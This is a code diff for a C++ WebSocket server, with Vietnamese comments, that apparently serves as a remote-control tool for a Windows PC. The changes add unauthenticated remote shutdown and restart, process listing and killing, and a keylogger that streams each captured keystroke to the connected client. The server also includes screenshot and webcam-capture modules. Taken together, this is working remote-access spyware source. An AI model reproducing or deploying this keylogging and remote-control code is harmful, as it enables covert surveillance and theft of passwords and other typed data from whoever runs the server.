@@ -12,6 +12,7 @@
 #define ASIO_STANDALONE
 #define _WEBSOCKETPP_CPP11_THREAD_
 #define _WEBSOCKETPP_NO_EXCEPTIONS_
+#define _WEBSOCKETPP_CPP11_TYPE_TRAITS_
 
 #include <websocketpp/config/asio_no_tls.hpp>
 #include <websocketpp/server.hpp>
@@ -19,11 +20,12 @@
 #include "../Application/ListApp.cpp"  // Chèn hàm liệt kê ứng dụng đã cài đặt
 #include "../Application/StartApp.cpp" // Chèn hàm khởi động ứng dụng
 #include "../Application/StopApp.cpp"  // Chèn hàm tắt ứng dụng
+#include "../Process/Process.cpp"    // Chèn hàm liệt kê tiến trình đang chạy
+#include "../Process/StopProc.cpp" // Chèn hàm tắt tiến trình theo PID
 
 #include "../Screen Shot/ScreenShot.cpp" // Chèn hàm chụp màn hình
 
 #include "../Webcam/Webcam.cpp" // Chèn hàm chụp ảnh từ webcam
-
 #include "../KeyLog/KeyLog.cpp" // Chèn hàm keylog
 
 #include <iostream>
@@ -40,12 +42,28 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
     std::string received = msg->get_payload();
     std::cout << "Received: " << received << std::endl;
     
-    if (received == "list_apps") {
+    if (received == "shutdown") {
+        system("shutdown /s /t 0");
+    }
+    else if (received == "restart") {
+        system("shutdown /r /t 0");
+    }
+    else if (received == "list_apps") {
         // Gọi hàm liệt kê ứng dụng và gửi kết quả về client
         std::string app_list; // Giả sử hàm này trả về danh sách ứng dụng đã cài đặt
         f.push_back(std::async(std::launch::async, ListApplication, std::ref(app_list)));
         f.back().wait();
         s->send(hdl, app_list, msg->get_opcode());
+        std::cout << "Sent app list." << std::endl;
+    }
+
+    else if (received == "list_processes") {
+        // Gọi hàm liệt kê tiến trình và gửi kết quả về client
+        std::string process_list; // Giả sử hàm này trả về danh sách tiến trình đang chạy
+        f.push_back(std::async(std::launch::async, ListRunningProcesses, std::ref(process_list)));
+        f.back().wait();
+		s->send(hdl, process_list, msg->get_opcode());
+        std::cout << "Sent process list." << std::endl;
     }
     
     else if (received.rfind("start_app:", 0) == 0) {
@@ -53,7 +71,6 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
         bool flag = false;
         f.push_back(std::async(std::launch::async, StartApplication, std::ref(app_to_start), std::ref(flag)));
         f.back().wait();
-        std::cerr << app_to_start << std::endl;
         if (!flag) {
             std::cerr << "Failed to start application: " << app_to_start << std::endl;
             s->send(hdl, "Failed to start application: " + app_to_start, msg->get_opcode());
@@ -65,13 +82,25 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
     else if (received.rfind("stop_app:", 0) == 0) {
         std::string app_to_stop = received.substr(9); // Lấy tên ứng dụng sau "stop_app:"
         bool flag = false;
-        f.push_back(std::async(std::launch::async, StartApplication, std::ref(app_to_stop), std::ref(flag)));
+        f.push_back(std::async(std::launch::async, StopApplication, std::ref(app_to_stop), std::ref(flag)));
+        f.back().wait();
         if (!flag) {
             std::cout << "Failed to stop application: " << app_to_stop << std::endl;
             s->send(hdl, "Failed to stop application: " + app_to_stop, msg->get_opcode());
             return;
         } 
         s->send(hdl, "Stopping application: " + app_to_stop, msg->get_opcode());
+    }
+
+    else if (received.rfind("stop_process:", 0) == 0) {
+        std::string pid_str = received.substr(13); // Lấy PID sau "stop_process:"
+        DWORD pid = std::stoul(pid_str);
+        if (!StopProcessById(pid)) {
+            std::cout << "Failed to stop process with PID: " << pid << std::endl;
+            s->send(hdl, "Failed to stop process with PID: " + pid_str, msg->get_opcode());
+            return;
+        } 
+        s->send(hdl, "Stopped process with PID: " + pid_str, msg->get_opcode());
     }
 
     else if (received == "screenshot") {
@@ -180,6 +209,7 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 for (int KEY = 8; KEY <= 255; KEY++){
                     if (GetAsyncKeyState(KEY) == -32767) {
                         if (SpecialKeys(KEY, output) == true) {
+                            s->send(hdl, "Keylog", msg->get_opcode());
                             s->send(hdl, output, msg->get_opcode());
                         }
                         else if (KEY >= 65 && KEY <= 90) { // Chữ cái A-Z
@@ -188,15 +218,18 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                             bool is_uppercase = shift_pressed ^ caps_active;
                             
                             if (is_uppercase) {
+                                s->send(hdl, "Keylog", msg->get_opcode());
                                 s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
                             } 
                             else {
+                                s->send(hdl, "Keylog", msg->get_opcode());
                                 s->send(hdl, std::string(1, char(KEY + 32)), msg->get_opcode());
                             }
                             
                         } 
                         // 3. Xử lý các ký tự khác (số 0-9, dấu chấm câu, v.v.)
                         else if (KEY >= 48 && KEY <= 57) { // Số 0-9
+                            s->send(hdl, "Keylog", msg->get_opcode());
                             s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
                         }
                     }
@@ -215,7 +248,6 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
     else {
         s->send(hdl, "Unknown command: " + received, msg->get_opcode());
     }
-
 }
 
 int main() {
@@ -227,7 +259,6 @@ int main() {
     std::vector<std::future<void>> f; // code đa luồng
 
     try {
-
         // comment 2 dong nay roi chay List App se ra chu TRUNG QUOC
         s.clear_access_channels(websocketpp::log::alevel::all);
         s.clear_error_channels(websocketpp::log::elevel::all);
@@ -244,5 +275,4 @@ int main() {
     catch (const std::exception& e) {
         std::cerr << "Error: " << e.what() << std::endl;
     }
-
 }
